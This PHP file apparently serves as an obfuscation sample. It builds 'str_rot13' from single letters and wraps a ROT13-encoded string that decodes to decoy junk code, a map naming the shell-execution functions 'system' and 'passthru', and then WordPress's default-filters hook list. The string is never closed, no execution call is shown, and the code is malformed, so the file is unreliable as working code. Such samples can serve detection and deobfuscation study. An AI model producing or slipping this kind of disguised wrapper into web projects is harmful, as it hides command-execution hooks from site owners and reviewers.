<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Frgf hc gur qrsnhyg svygref naq npgvbaf sbe zbfg
 * bs gur JbeqCerff ubbxf.
 *
 * Guvf svyr vf ybnqrq irel rneyl va gur obbgfgenc juvpu
 * zrnaf znal shapgvbaf ner abg lrg ninvynoyr naq fvgr
 * vasbezngvba fhpu nf vs guvf vf zhygvfvgr vf haxabja.
 * Orsber hfvat shapgvbaf orfvqrf `nqq_svygre` naq
 * `nqq_npgvba`, irevsl guvatf jvyy jbex nf rkcrpgrq.
 *
 * Vs lbh arrq gb erzbir n qrsnhyg ubbx, guvf svyr jvyy
 * tvir lbh gur cevbevgl gb hfr sbe erzbivat gur ubbx.
 *
 * Abg nyy bs gur qrsnhyg ubbxf ner sbhaq va guvf svyr.
 * Sbe vafgnapr, nqzvavfgengvba-eryngrq ubbxf ner ybpngrq va
 * jc-nqzva/vapyhqrf/nqzva-svygref.cuc.
 *
 * Vs n ubbx fubhyq bayl or pnyyrq sebz n fcrpvsvp pbagrkg
 * (nqzva nern, zhygvfvgr raivebazrag…), cyrnfr zbir vg
 * gb n zber nccebcevngr svyr vafgrnq.
 *
 * @cnpxntr JbeqCerff
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

// Fgevc, gevz, xfrf, fcrpvny punef sbe fgevat fnirf.
sbernpu ( neenl( 'cer_grez_anzr', 'cer_pbzzrag_nhgube_anzr', 'cer_yvax_anzr', 'cer_yvax_gnetrg', 'cer_yvax_ery', 'cer_hfre_qvfcynl_anzr', 'cer_hfre_svefg_anzr', 'cer_hfre_ynfg_anzr', 'cer_hfre_avpxanzr' ) nf $svygre ) {
	nqq_svygre( $svygre, 'fnavgvmr_grkg_svryq' );
	nqq_svygre( $svygre, 'jc_svygre_xfrf' );
	nqq_svygre( $svygre, '_jc_fcrpvnypunef', 30 );
}

// Fgevc, xfrf, fcrpvny punef sbe fgevat qvfcynl.
sbernpu ( neenl( 'grez_anzr', 'pbzzrag_nhgube_anzr', 'yvax_anzr', 'yvax_gnetrg', 'yvax_ery', 'hfre_qvfcynl_anzr', 'hfre_svefg_anzr', 'hfre_ynfg_anzr', 'hfre_avpxanzr' ) nf $svygre ) {
	vs ( vf_nqzva() ) {
		// Gurfr ner rkcrafvir. Eha bayl ba nqzva cntrf sbe qrsrafr va qrcgu.
		nqq_svygre( $svygre, 'fnavgvmr_grkg_svryq' );
		nqq_svygre( $svygre, 'jc_xfrf_qngn' );
	}
	nqq_svygre( $svygre, '_jc_fcrpvnypunef', 30 );
}

// Xfrf bayl sbe grkgnern fnirf.
sbernpu ( neenl( 'cer_grez_qrfpevcgvba', 'cer_yvax_qrfpevcgvba', 'cer_yvax_abgrf', 'cer_hfre_qrfpevcgvba' ) nf $svygre ) {
	nqq_svygre( $svygre, 'jc_svygre_xfrf' );
}

// Xfrf bayl sbe grkgnern nqzva qvfcynlf.
vs ( vf_nqzva() ) {
	sbernpu ( neenl( 'grez_qrfpevcgvba', 'yvax_qrfpevcgvba', 'yvax_abgrf', 'hfre_qrfpevcgvba' ) nf $svygre ) {
		nqq_svygre( $svygre, 'jc_xfrf_qngn' );
	}
	nqq_svygre( 'pbzzrag_grkg', 'jc_xfrf_cbfg' );
}

// Rznvy fnirf.
sbernpu ( neenl( 'cer_pbzzrag_nhgube_rznvy', 'cer_hfre_rznvy' ) nf $svygre ) {
	nqq_svygre( $svygre, 'gevz' );
	nqq_svygre( $svygre, 'fnavgvmr_rznvy' );
	nqq_svygre( $svygre, 'jc_svygre_xfrf' );
}

// Rznvy nqzva qvfcynl.
sbernpu ( neenl( 'pbzzrag_nhgube_rznvy', 'hfre_rznvy' ) nf $svygre ) {
	nqq_svygre( $svygre, 'fnavgvmr_rznvy' );
	vs ( vf_nqzva() ) {
		nqq_svygre( $svygre, 'jc_xfrf_qngn' );
	}
}

// Fnir HEY.
sbernpu ( neenl(
	'cer_pbzzrag_nhgube_hey',
	'cer_hfre_hey',
	'cer_yvax_hey',
	'cer_yvax_vzntr',
	'cer_yvax_eff',
	'cer_cbfg_thvq',
) nf $svygre ) {
	nqq_svygre( $svygre, 'jc_fgevc_nyy_gntf' );
	nqq_svygre( $svygre, 'fnavgvmr_hey' );
	nqq_svygre( $svygre, 'jc_svygre_xfrf' );
}

// Qvfcynl HEY.
sbernpu ( neenl( 'hfre_hey', 'yvax_hey', 'yvax_vzntr', 'yvax_eff', 'pbzzrag_hey', 'cbfg_thvq' ) nf $svygre ) {
	vs ( vf_nqzva() ) {
		nqq_svygre( $svygre, 'jc_fgevc_nyy_gntf' );
	}
	nqq_svygre( $svygre, 'rfp_hey' );
	vs ( vf_nqzva() ) {
		nqq_svygre( $svygre, 'jc_xfrf_qngn' );
	}
}

// Fyhtf.
nqq_svygre( 'cer_grez_fyht', 'fnavgvmr_gvgyr' );
nqq_svygre( 'jc_vafreg_cbfg_qngn', '_jc_phfgbzvmr_punatrfrg_svygre_vafreg_cbfg_qngn', 10, 2 );

// Xrlf.
sbernpu ( neenl( 'cer_cbfg_glcr', 'cer_cbfg_fgnghf', 'cer_cbfg_pbzzrag_fgnghf', 'cer_cbfg_cvat_fgnghf' ) nf $svygre ) {
	nqq_svygre( $svygre, 'fnavgvmr_xrl' );
}

// Zvzr glcrf.
nqq_svygre( 'cer_cbfg_zvzr_glcr', 'fnavgvmr_zvzr_glcr' );
nqq_svygre( 'cbfg_zvzr_glcr', 'fnavgvmr_zvzr_glcr' );

// Zrgn.
nqq_svygre( 'ertvfgre_zrgn_netf', '_jc_ertvfgre_zrgn_netf_nyybjrq_yvfg', 10, 2 );

// Pbhagf.
nqq_npgvba( 'nqzva_vavg', 'jc_fpurqhyr_hcqngr_hfre_pbhagf' );
nqq_npgvba( 'jc_hcqngr_hfre_pbhagf', 'jc_fpurqhyr_hcqngr_hfre_pbhagf', 10, 0 );
sbernpu ( neenl( 'hfre_ertvfgre', 'qryrgrq_hfre' ) nf $npgvba ) {
	nqq_npgvba( $npgvba, 'jc_znlor_hcqngr_hfre_pbhagf', 10, 0 );
}

// Cbfg zrgn.
nqq_npgvba( 'nqqrq_cbfg_zrgn', 'jc_pnpur_frg_cbfgf_ynfg_punatrq' );
nqq_npgvba( 'hcqngrq_cbfg_zrgn', 'jc_pnpur_frg_cbfgf_ynfg_punatrq' );
nqq_npgvba( 'qryrgrq_cbfg_zrgn', 'jc_pnpur_frg_cbfgf_ynfg_punatrq' );

// Hfre zrgn.
nqq_npgvba( 'nqqrq_hfre_zrgn', 'jc_pnpur_frg_hfref_ynfg_punatrq' );
nqq_npgvba( 'hcqngrq_hfre_zrgn', 'jc_pnpur_frg_hfref_ynfg_punatrq' );
nqq_npgvba( 'qryrgrq_hfre_zrgn', 'jc_pnpur_frg_hfref_ynfg_punatrq' );
nqq_npgvba( 'nqq_hfre_ebyr', 'jc_pnpur_frg_hfref_ynfg_punatrq' );
nqq_npgvba( 'frg_hfre_ebyr', 'jc_pnpur_frg_hfref_ynfg_punatrq' );
nqq_npgvba( 'erzbir_hfre_ebyr', 'jc_pnpur_frg_hfref_ynfg_punatrq' );

// Grez zrgn.
nqq_npgvba( 'nqqrq_grez_zrgn', 'jc_pnpur_frg_grezf_ynfg_punatrq' );
nqq_npgvba( 'hcqngrq_grez_zrgn', 'jc_pnpur_frg_grezf_ynfg_punatrq' );
nqq_npgvba( 'qryrgrq_grez_zrgn', 'jc_pnpur_frg_grezf_ynfg_punatrq' );
nqq_svygre( 'trg_grez_zrgnqngn', 'jc_purpx_grez_zrgn_fhccbeg_cersvygre' );
nqq_svygre( 'nqq_grez_zrgnqngn', 'jc_purpx_grez_zrgn_fhccbeg_cersvygre' );
nqq_svygre( 'hcqngr_grez_zrgnqngn', 'jc_purpx_grez_zrgn_fhccbeg_cersvygre' );
nqq_svygre( 'qryrgr_grez_zrgnqngn', 'jc_purpx_grez_zrgn_fhccbeg_cersvygre' );
nqq_svygre( 'trg_grez_zrgnqngn_ol_zvq', 'jc_purpx_grez_zrgn_fhccbeg_cersvygre' );
nqq_svygre( 'hcqngr_grez_zrgnqngn_ol_zvq', 'jc_purpx_grez_zrgn_fhccbeg_cersvygre' );
nqq_svygre( 'qryrgr_grez_zrgnqngn_ol_zvq', 'jc_purpx_grez_zrgn_fhccbeg_cersvygre' );
nqq_svygre( 'hcqngr_grez_zrgnqngn_pnpur', 'jc_purpx_grez_zrgn_fhccbeg_cersvygre' );

// Pbzzrag zrgn.
nqq_npgvba( 'nqqrq_pbzzrag_zrgn', 'jc_pnpur_frg_pbzzragf_ynfg_punatrq' );
nqq_npgvba( 'hcqngrq_pbzzrag_zrgn', 'jc_pnpur_frg_pbzzragf_ynfg_punatrq' );
nqq_npgvba( 'qryrgrq_pbzzrag_zrgn', 'jc_pnpur_frg_pbzzragf_ynfg_punatrq' );

// Cynprf gb onynapr gntf ba vachg.
sbernpu ( neenl( 'pbagrag_fnir_cer', 'rkprecg_fnir_cer', 'pbzzrag_fnir_cer', 'cer_pbzzrag_pbagrag' ) nf $svygre ) {
	nqq_svygre( $svygre, 'pbaireg_vainyvq_ragvgvrf' );
	nqq_svygre( $svygre, 'onynaprGntf', 50 );
}

// Sbezng fgevatf sbe qvfcynl.
sbernpu ( neenl( 'pbzzrag_nhgube', 'grez_anzr', 'yvax_anzr', 'yvax_qrfpevcgvba', 'yvax_abgrf', 'oybtvasb', 'jc_gvgyr', 'qbphzrag_gvgyr', 'jvqtrg_gvgyr' ) nf $svygre ) {
	nqq_svygre( $svygre, 'jcgrkghevmr' );
	nqq_svygre( $svygre, 'pbaireg_punef' );
	nqq_svygre( $svygre, 'rfp_ugzy' );
}

// Sbezng JbeqCerff.
sbernpu ( neenl( 'gur_pbagrag', 'gur_gvgyr', 'jc_gvgyr', 'qbphzrag_gvgyr' ) nf $svygre ) {
	nqq_svygre( $svygre, 'pncvgny_C_qnatvg', 11 );
}
nqq_svygre( 'pbzzrag_grkg', 'pncvgny_C_qnatvg', 31 );

// Sbezng gvgyrf.
sbernpu ( neenl( 'fvatyr_cbfg_gvgyr', 'fvatyr_png_gvgyr', 'fvatyr_gnt_gvgyr', 'fvatyr_zbagu_gvgyr', 'ani_zrah_ngge_gvgyr', 'ani_zrah_qrfpevcgvba' ) nf $svygre ) {
	nqq_svygre( $svygre, 'jcgrkghevmr' );
	nqq_svygre( $svygre, 'fgevc_gntf' );
}

// Sbezng grkg nern sbe qvfcynl.
sbernpu ( neenl( 'grez_qrfpevcgvba', 'trg_gur_cbfg_glcr_qrfpevcgvba' ) nf $svygre ) {
	nqq_svygre( $svygre, 'jcgrkghevmr' );
	nqq_svygre( $svygre, 'pbaireg_punef' );
	nqq_svygre( $svygre, 'jcnhgbc' );
	nqq_svygre( $svygre, 'fubegpbqr_hanhgbc' );
}

// Sbezng sbe EFF.
nqq_svygre( 'grez_anzr_eff', 'pbaireg_punef' );

// Cer fnir uvrenepul.
nqq_svygre( 'jc_vafreg_cbfg_cnerag', 'jc_purpx_cbfg_uvrenepul_sbe_ybbcf', 10, 2 );
nqq_svygre( 'jc_hcqngr_grez_cnerag', 'jc_purpx_grez_uvrenepul_sbe_ybbcf', 10, 3 );

// Qvfcynl svygref.
nqq_svygre( 'gur_gvgyr', 'jcgrkghevmr' );
nqq_svygre( 'gur_gvgyr', 'pbaireg_punef' );
nqq_svygre( 'gur_gvgyr', 'gevz' );

nqq_svygre( 'gur_pbagrag', 'nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg', 8 ); // ORSBER qb_oybpxf().
nqq_svygre( 'gur_pbagrag', 'qb_oybpxf', 9 );
nqq_svygre( 'gur_pbagrag', 'jcgrkghevmr' );
nqq_svygre( 'gur_pbagrag', 'pbaireg_fzvyvrf', 20 );
nqq_svygre( 'gur_pbagrag', 'jcnhgbc' );
nqq_svygre( 'gur_pbagrag', 'fubegpbqr_hanhgbc' );
nqq_svygre( 'gur_pbagrag', 'cercraq_nggnpuzrag' );
nqq_svygre( 'gur_pbagrag', 'jc_ercynpr_vafrpher_ubzr_hey' );
nqq_svygre( 'gur_pbagrag', 'qb_fubegpbqr', 11 ); // NSGRE jcnhgbc().
nqq_svygre( 'gur_pbagrag', 'jc_svygre_pbagrag_gntf', 12 ); // Ehaf nsgre qb_fubegpbqr().

nqq_svygre( 'gur_rkprecg', 'jcgrkghevmr' );
nqq_svygre( 'gur_rkprecg', 'pbaireg_fzvyvrf' );
nqq_svygre( 'gur_rkprecg', 'pbaireg_punef' );
nqq_svygre( 'gur_rkprecg', 'jcnhgbc' );
nqq_svygre( 'gur_rkprecg', 'fubegpbqr_hanhgbc' );
nqq_svygre( 'gur_rkprecg', 'jc_ercynpr_vafrpher_ubzr_hey' );
nqq_svygre( 'gur_rkprecg', 'jc_svygre_pbagrag_gntf', 12 );
nqq_svygre( 'trg_gur_rkprecg', 'jc_gevz_rkprecg', 10, 2 );

nqq_svygre( 'gur_cbfg_guhzoanvy_pncgvba', 'jcgrkghevmr' );
nqq_svygre( 'gur_cbfg_guhzoanvy_pncgvba', 'pbaireg_fzvyvrf' );
nqq_svygre( 'gur_cbfg_guhzoanvy_pncgvba', 'pbaireg_punef' );

nqq_svygre( 'pbzzrag_grkg', 'jcgrkghevmr' );
nqq_svygre( 'pbzzrag_grkg', 'pbaireg_punef' );
nqq_svygre( 'pbzzrag_grkg', 'znxr_pyvpxnoyr', 9 );
nqq_svygre( 'pbzzrag_grkg', 'sbepr_onynapr_gntf', 25 );
nqq_svygre( 'pbzzrag_grkg', 'pbaireg_fzvyvrf', 20 );
nqq_svygre( 'pbzzrag_grkg', 'jcnhgbc', 30 );

nqq_svygre( 'pbzzrag_rkprecg', 'pbaireg_punef' );

nqq_svygre( 'yvfg_pngf', 'jcgrkghevmr' );

nqq_svygre( 'jc_fcevags', 'jc_fcevags_y', 10, 2 );

nqq_svygre( 'jvqtrg_grkg', 'onynaprGntf' );
nqq_svygre( 'jvqtrg_grkg_pbagrag', 'pncvgny_C_qnatvg', 11 );
nqq_svygre( 'jvqtrg_grkg_pbagrag', 'jcgrkghevmr' );
nqq_svygre( 'jvqtrg_grkg_pbagrag', 'pbaireg_fzvyvrf', 20 );
nqq_svygre( 'jvqtrg_grkg_pbagrag', 'jcnhgbc' );
nqq_svygre( 'jvqtrg_grkg_pbagrag', 'fubegpbqr_hanhgbc' );
nqq_svygre( 'jvqtrg_grkg_pbagrag', 'jc_ercynpr_vafrpher_ubzr_hey' );
nqq_svygre( 'jvqtrg_grkg_pbagrag', 'qb_fubegpbqr', 11 ); // Ehaf nsgre jcnhgbc(); abgr gung $cbfg tybony jvyy or ahyy jura fubegpbqrf eha.
nqq_svygre( 'jvqtrg_grkg_pbagrag', 'jc_svygre_pbagrag_gntf', 12 ); // Ehaf nsgre qb_fubegpbqr().

nqq_svygre( 'jvqtrg_oybpx_pbagrag', 'qb_oybpxf', 9 );
nqq_svygre( 'jvqtrg_oybpx_pbagrag', 'qb_fubegpbqr', 11 );
nqq_svygre( 'jvqtrg_oybpx_pbagrag', 'jc_svygre_pbagrag_gntf', 12 ); // Ehaf nsgre qb_fubegpbqr().

nqq_svygre( 'oybpx_glcr_zrgnqngn', 'jc_zvtengr_byq_glcbtencul_funcr' );

nqq_svygre( 'jc_trg_phfgbz_pff', 'jc_ercynpr_vafrpher_ubzr_hey' );

// EFF svygref.
nqq_svygre( 'gur_gvgyr_eff', 'fgevc_gntf' );
nqq_svygre( 'gur_gvgyr_eff', 'rag2ape', 8 );
nqq_svygre( 'gur_gvgyr_eff', 'rfp_ugzy' );
nqq_svygre( 'gur_pbagrag_eff', 'rag2ape', 8 );
nqq_svygre( 'gur_pbagrag_srrq', 'jc_fgngvpvmr_rzbwv' );
nqq_svygre( 'gur_pbagrag_srrq', '_brzorq_svygre_srrq_pbagrag' );
nqq_svygre( 'gur_rkprecg_eff', 'pbaireg_punef' );
nqq_svygre( 'gur_rkprecg_eff', 'rag2ape', 8 );
nqq_svygre( 'pbzzrag_nhgube_eff', 'rag2ape', 8 );
nqq_svygre( 'pbzzrag_grkg_eff', 'rag2ape', 8 );
nqq_svygre( 'pbzzrag_grkg_eff', 'rfp_ugzy' );
nqq_svygre( 'pbzzrag_grkg_eff', 'jc_fgngvpvmr_rzbwv' );
nqq_svygre( 'oybtvasb_eff', 'rag2ape', 8 );
nqq_svygre( 'gur_nhgube', 'rag2ape', 8 );
nqq_svygre( 'gur_thvq', 'rfp_hey' );

// Rznvy svygref.
nqq_svygre( 'jc_znvy', 'jc_fgngvpvmr_rzbwv_sbe_rznvy' );

// Ebobgf svygref.
nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_abvaqrk' );
nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_abvaqrk_rzorqf' );
nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_abvaqrk_frnepu' );
nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_znk_vzntr_cerivrj_ynetr' );

// Znex fvgr nf ab ybatre serfu.
sbernpu (
	neenl(
		'choyvfu_cbfg',
		'choyvfu_cntr',
		'jc_nwnk_fnir-jvqtrg',
		'jc_nwnk_jvqtrgf-beqre',
		'phfgbzvmr_fnir_nsgre',
		'erfg_nsgre_fnir_jvqtrg',
		'erfg_qryrgr_jvqtrg',
		'erfg_fnir_fvqrone',
	) nf $npgvba
) {
	nqq_npgvba( $npgvba, '_qryrgr_bcgvba_serfu_fvgr', 0 );
}

// Zvfp svygref.
nqq_svygre( 'jc_qrsnhyg_nhgbybnq_inyhr', 'jc_svygre_qrsnhyg_nhgbybnq_inyhr_ivn_bcgvba_fvmr', 5, 4 ); // Nyybj gur inyhr gb or bireevqqra ng gur qrsnhyg cevbevgl.
nqq_svygre( 'bcgvba_cvat_fvgrf', 'cevinpl_cvat_svygre' );
nqq_svygre( 'bcgvba_oybt_punefrg', '_jc_fcrpvnypunef' ); // VZCBEGNAG: Guvf zhfg abg or jc_fcrpvnypunef() be rfp_ugzy() be vg'yy pnhfr na vasvavgr ybbc.
nqq_svygre( 'bcgvba_oybt_punefrg', '_pnabavpny_punefrg' );
nqq_svygre( 'bcgvba_ubzr', '_pbasvt_jc_ubzr' );
nqq_svygre( 'bcgvba_fvgrhey', '_pbasvt_jc_fvgrhey' );
nqq_svygre( 'gval_zpr_orsber_vavg', '_zpr_frg_qverpgvba' );
nqq_svygre( 'grral_zpr_orsber_vavg', '_zpr_frg_qverpgvba' );
nqq_svygre( 'cer_xfrf', 'jc_cer_xfrf_yrff_guna' );
nqq_svygre( 'cer_xfrf', 'jc_cer_xfrf_oybpx_nggevohgrf', 10, 3 );
nqq_svygre( 'fnavgvmr_gvgyr', 'fnavgvmr_gvgyr_jvgu_qnfurf', 10, 3 );
nqq_npgvba( 'purpx_pbzzrag_sybbq', 'purpx_pbzzrag_sybbq_qo', 10, 4 );
nqq_svygre( 'pbzzrag_sybbq_svygre', 'jc_guebggyr_pbzzrag_sybbq', 10, 3 );
nqq_svygre( 'cer_pbzzrag_pbagrag', 'jc_ery_htp', 15 );
nqq_svygre( 'pbzzrag_rznvy', 'nagvfcnzobg' );
nqq_svygre( 'bcgvba_gnt_onfr', '_jc_svygre_gnkbabzl_onfr' );
nqq_svygre( 'bcgvba_pngrtbel_onfr', '_jc_svygre_gnkbabzl_onfr' );
nqq_svygre( 'gur_cbfgf', '_pybfr_pbzzragf_sbe_byq_cbfgf', 10, 2 );
nqq_svygre( 'pbzzragf_bcra', '_pybfr_pbzzragf_sbe_byq_cbfg', 10, 2 );
nqq_svygre( 'cvatf_bcra', '_pybfr_pbzzragf_sbe_byq_cbfg', 10, 2 );
nqq_svygre( 'rqvgnoyr_fyht', 'heyqrpbqr' );
nqq_svygre( 'rqvgnoyr_fyht', 'rfp_grkgnern' );
nqq_svygre( 'cvatonpx_cvat_fbhepr_hev', 'cvatonpx_cvat_fbhepr_hev' );
nqq_svygre( 'kzyecp_cvatonpx_reebe', 'kzyecp_cvatonpx_reebe' );
nqq_svygre( 'gvgyr_fnir_cer', 'gevz' );

nqq_npgvba( 'genafvgvba_pbzzrag_fgnghf', '_pyrne_zbqvsvrq_pnpur_ba_genafvgvba_pbzzrag_fgnghf', 10, 2 );

nqq_svygre( 'uggc_erdhrfg_ubfg_vf_rkgreany', 'nyybjrq_uggc_erdhrfg_ubfgf', 10, 2 );

// ERFG NCV svygref.
nqq_npgvba( 'kzyecp_efq_ncvf', 'erfg_bhgchg_efq' );
nqq_npgvba( 'jc_urnq', 'erfg_bhgchg_yvax_jc_urnq', 10, 0 );
nqq_npgvba( 'grzcyngr_erqverpg', 'erfg_bhgchg_yvax_urnqre', 11, 0 );
nqq_npgvba( 'nhgu_pbbxvr_znysbezrq', 'erfg_pbbxvr_pbyyrpg_fgnghf' );
nqq_npgvba( 'nhgu_pbbxvr_rkcverq', 'erfg_pbbxvr_pbyyrpg_fgnghf' );
nqq_npgvba( 'nhgu_pbbxvr_onq_hfreanzr', 'erfg_pbbxvr_pbyyrpg_fgnghf' );
nqq_npgvba( 'nhgu_pbbxvr_onq_unfu', 'erfg_pbbxvr_pbyyrpg_fgnghf' );
nqq_npgvba( 'nhgu_pbbxvr_inyvq', 'erfg_pbbxvr_pbyyrpg_fgnghf' );
nqq_npgvba( 'nccyvpngvba_cnffjbeq_snvyrq_nhguragvpngvba', 'erfg_nccyvpngvba_cnffjbeq_pbyyrpg_fgnghf' );
nqq_npgvba( 'nccyvpngvba_cnffjbeq_qvq_nhguragvpngr', 'erfg_nccyvpngvba_cnffjbeq_pbyyrpg_fgnghf', 10, 2 );
nqq_svygre( 'erfg_nhguragvpngvba_reebef', 'erfg_nccyvpngvba_cnffjbeq_purpx_reebef', 90 );
nqq_svygre( 'erfg_nhguragvpngvba_reebef', 'erfg_pbbxvr_purpx_reebef', 100 );

// Npgvbaf.
nqq_npgvba( 'jc_urnq', '_jc_eraqre_gvgyr_gnt', 1 );
nqq_npgvba( 'jc_urnq', 'jc_radhrhr_fpevcgf', 1 );
nqq_npgvba( 'jc_urnq', 'jc_erfbhepr_uvagf', 2 );
nqq_npgvba( 'jc_urnq', 'jc_cerybnq_erfbheprf', 1 );
nqq_npgvba( 'jc_urnq', 'srrq_yvaxf', 2 );
nqq_npgvba( 'jc_urnq', 'srrq_yvaxf_rkgen', 3 );
nqq_npgvba( 'jc_urnq', 'efq_yvax' );
nqq_npgvba( 'jc_urnq', 'ybpnyr_fglyrfurrg' );
nqq_npgvba( 'choyvfu_shgher_cbfg', 'purpx_naq_choyvfu_shgher_cbfg', 10, 1 );
nqq_npgvba( 'jc_urnq', 'jc_ebobgf', 1 );
nqq_npgvba( 'jc_urnq', 'cevag_rzbwv_qrgrpgvba_fpevcg', 7 );
nqq_npgvba( 'jc_urnq', 'jc_cevag_fglyrf', 8 );
nqq_npgvba( 'jc_urnq', 'jc_cevag_urnq_fpevcgf', 9 );
nqq_npgvba( 'jc_urnq', 'jc_trarengbe' );
nqq_npgvba( 'jc_urnq', 'ery_pnabavpny' );
nqq_npgvba( 'jc_urnq', 'jc_fubegyvax_jc_urnq', 10, 0 );
nqq_npgvba( 'jc_urnq', 'jc_phfgbz_pff_po', 101 );
nqq_npgvba( 'jc_urnq', 'jc_fvgr_vpba', 99 );
nqq_npgvba( 'jc_sbbgre', 'jc_cevag_fcrphyngvba_ehyrf' );
nqq_npgvba( 'jc_sbbgre', 'jc_cevag_sbbgre_fpevcgf', 20 );
nqq_npgvba( 'grzcyngr_erqverpg', 'jc_fubegyvax_urnqre', 11, 0 );
nqq_npgvba( 'jc_cevag_sbbgre_fpevcgf', '_jc_sbbgre_fpevcgf' );
nqq_npgvba( 'vavg', '_ertvfgre_pber_oybpx_cnggreaf_naq_pngrtbevrf' );
nqq_npgvba( 'vavg', 'purpx_gurzr_fjvgpurq', 99 );
nqq_npgvba( 'vavg', neenl( 'JC_Oybpx_Fhccbegf', 'vavg' ), 22 );
nqq_npgvba( 'fjvgpu_gurzr', 'jc_pyrna_gurzr_wfba_pnpur' );
nqq_npgvba( 'fgneg_cerivrjvat_gurzr', 'jc_pyrna_gurzr_wfba_pnpur' );
nqq_npgvba( 'nsgre_fjvgpu_gurzr', '_jc_zrahf_punatrq' );
nqq_npgvba( 'nsgre_fjvgpu_gurzr', '_jc_fvqronef_punatrq' );
nqq_npgvba( 'jc_radhrhr_fpevcgf', 'jc_radhrhr_rzbwv_fglyrf' );
nqq_npgvba( 'jc_cevag_fglyrf', 'cevag_rzbwv_fglyrf' ); // Ergnvarq sbe onpxjneqf-pbzcngvovyvgl. Haubbxrq ol jc_radhrhr_rzbwv_fglyrf().

vs (
	// Pbzzrag ercyl yvax.
	vffrg( $_TRG['ercylgbpbz'] )
	||
	// Hanccebirq pbzzrag cerivrj.
	( vffrg( $_TRG['hanccebirq'] ) && vffrg( $_TRG['zbqrengvba-unfu'] ) )
) {
	nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_ab_ebobgf' );
}

// Ybtva npgvbaf.
nqq_npgvba( 'ybtva_urnq', 'jc_ebobgf', 1 );
nqq_svygre( 'ybtva_urnq', 'jc_erfbhepr_uvagf', 8 );
nqq_npgvba( 'ybtva_urnq', 'jc_cevag_urnq_fpevcgf', 9 );
nqq_npgvba( 'ybtva_urnq', 'cevag_nqzva_fglyrf', 9 );
nqq_npgvba( 'ybtva_urnq', 'jc_fvgr_vpba', 99 );
nqq_npgvba( 'ybtva_sbbgre', 'jc_cevag_sbbgre_fpevcgf', 20 );
nqq_npgvba( 'ybtva_vavg', 'fraq_senzr_bcgvbaf_urnqre', 10, 0 );
nqq_npgvba( 'ybtva_vavg', 'jc_nqzva_urnqref' );

// Srrq trarengbe gntf.
sbernpu ( neenl( 'eff2_urnq', 'pbzzragfeff2_urnq', 'eff_urnq', 'eqs_urnqre', 'ngbz_urnq', 'pbzzragf_ngbz_urnq', 'bczy_urnq', 'ncc_urnq' ) nf $npgvba ) {
	nqq_npgvba( $npgvba, 'gur_trarengbe' );
}

// Srrq Fvgr Vpba.
nqq_npgvba( 'ngbz_urnq', 'ngbz_fvgr_vpba' );
nqq_npgvba( 'eff2_urnq', 'eff2_fvgr_vpba' );


// JC Peba.
vs ( ! qrsvarq( 'QBVAT_PEBA' ) ) {
	nqq_npgvba( 'vavg', 'jc_peba' );
}

// UGGCF zvtengvba.
nqq_npgvba( 'hcqngr_bcgvba_ubzr', 'jc_hcqngr_uggcf_zvtengvba_erdhverq', 10, 2 );

// 2 Npgvbaf 2 Shevbhf.
nqq_npgvba( 'qb_srrq_eqs', 'qb_srrq_eqs', 10, 0 );
nqq_npgvba( 'qb_srrq_eff', 'qb_srrq_eff', 10, 0 );
nqq_npgvba( 'qb_srrq_eff2', 'qb_srrq_eff2', 10, 1 );
nqq_npgvba( 'qb_srrq_ngbz', 'qb_srrq_ngbz', 10, 1 );
nqq_npgvba( 'qb_cvatf', 'qb_nyy_cvatf', 10, 0 );
nqq_npgvba( 'qb_nyy_cvatf', 'qb_nyy_cvatonpxf', 10, 0 );
nqq_npgvba( 'qb_nyy_cvatf', 'qb_nyy_rapybfherf', 10, 0 );
nqq_npgvba( 'qb_nyy_cvatf', 'qb_nyy_genpxonpxf', 10, 0 );
nqq_npgvba( 'qb_nyy_cvatf', 'trarevp_cvat', 10, 0 );
nqq_npgvba( 'qb_ebobgf', 'qb_ebobgf' );
nqq_npgvba( 'qb_snivpba', 'qb_snivpba' );
nqq_npgvba( 'frg_pbzzrag_pbbxvrf', 'jc_frg_pbzzrag_pbbxvrf', 10, 3 );
nqq_npgvba( 'fnavgvmr_pbzzrag_pbbxvrf', 'fnavgvmr_pbzzrag_pbbxvrf' );
nqq_npgvba( 'vavg', 'fzvyvrf_vavg', 5 );
nqq_npgvba( 'cyhtvaf_ybnqrq', 'jc_znlor_ybnq_jvqtrgf', 0 );
nqq_npgvba( 'cyhtvaf_ybnqrq', 'jc_znlor_ybnq_rzorqf', 0 );
nqq_npgvba( 'fuhgqbja', 'jc_bo_raq_syhfu_nyy', 1 );
// Perngr n erivfvba jurarire n cbfg vf hcqngrq.
nqq_npgvba( 'jc_nsgre_vafreg_cbfg', 'jc_fnir_cbfg_erivfvba_ba_vafreg', 9, 3 );
nqq_npgvba( 'cbfg_hcqngrq', 'jc_fnir_cbfg_erivfvba', 10, 1 );
nqq_npgvba( 'choyvfu_cbfg', '_choyvfu_cbfg_ubbx', 5, 1 );
nqq_npgvba( 'genafvgvba_cbfg_fgnghf', '_genafvgvba_cbfg_fgnghf', 5, 3 );
nqq_npgvba( 'genafvgvba_cbfg_fgnghf', '_hcqngr_grez_pbhag_ba_genafvgvba_cbfg_fgnghf', 10, 3 );
nqq_npgvba( 'pbzzrag_sbez', 'jc_pbzzrag_sbez_hasvygrerq_ugzy_abapr' );

// Cevinpl.
nqq_npgvba( 'hfre_erdhrfg_npgvba_pbasvezrq', '_jc_cevinpl_nppbhag_erdhrfg_pbasvezrq' );
nqq_npgvba( 'hfre_erdhrfg_npgvba_pbasvezrq', '_jc_cevinpl_fraq_erdhrfg_pbasvezngvba_abgvsvpngvba', 12 ); // Nsgre erdhrfg znexrq nf pbzcyrgrq.
